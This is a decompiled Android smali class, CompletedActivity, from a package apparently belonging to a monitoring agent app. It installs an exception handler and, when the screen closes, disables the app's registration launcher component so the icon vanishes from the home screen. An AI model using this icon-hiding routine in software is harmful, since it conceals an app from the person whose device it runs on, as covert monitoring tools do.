.class public Lcom/hp/vd/CompletedActivity;
.super Landroid/app/Activity;
.source "CompletedActivity.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 13
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method public actionFinish(Landroid/view/View;)V
    .locals 0

    .line 49
    invoke-virtual {p0}, Lcom/hp/vd/CompletedActivity;->finish()V

    return-void
.end method

.method protected hideApplicationLauncher()V
    .locals 4

    .line 33
    invoke-virtual {p0}, Lcom/hp/vd/CompletedActivity;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    .line 35
    new-instance v1, Landroid/content/ComponentName;

    const-class v2, Lcom/hp/vd/RegisterActivity;

    invoke-direct {v1, p0, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/4 v2, 0x2

    const/4 v3, 0x1

    .line 40
    invoke-virtual {v0, v1, v2, v3}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    return-void
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 2

    .line 18
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 20
    new-instance p1, Lcom/hp/vd/agent/ExceptionHandler;

    .line 22
    invoke-static {}, Ljava/lang/Thread;->getDefaultUncaughtExceptionHandler()Ljava/lang/Thread$UncaughtExceptionHandler;

    move-result-object v0

    .line 23
    invoke-virtual {p0}, Lcom/hp/vd/CompletedActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-direct {p1, v0, v1}, Lcom/hp/vd/agent/ExceptionHandler;-><init>(Ljava/lang/Thread$UncaughtExceptionHandler;Landroid/content/Context;)V

    .line 20
    invoke-static {p1}, Ljava/lang/Thread;->setDefaultUncaughtExceptionHandler(Ljava/lang/Thread$UncaughtExceptionHandler;)V

    const/4 p1, 0x1

    .line 27
    invoke-virtual {p0, p1}, Lcom/hp/vd/CompletedActivity;->requestWindowFeature(I)Z

    const/high16 p1, 0x7f080000

    .line 28
    invoke-virtual {p0, p1}, Lcom/hp/vd/CompletedActivity;->setContentView(I)V

    return-void
.end method

.method public onDestroy()V
    .locals 2

    .line 55
    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    const-string v0, "###"

    const-string v1, "onDestroy() on completed called."

    .line 57
    invoke-static {v0, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 60
    :try_start_0
    invoke-virtual {p0}, Lcom/hp/vd/CompletedActivity;->hideApplicationLauncher()V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    .line 63
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_0
    return-void
.end method
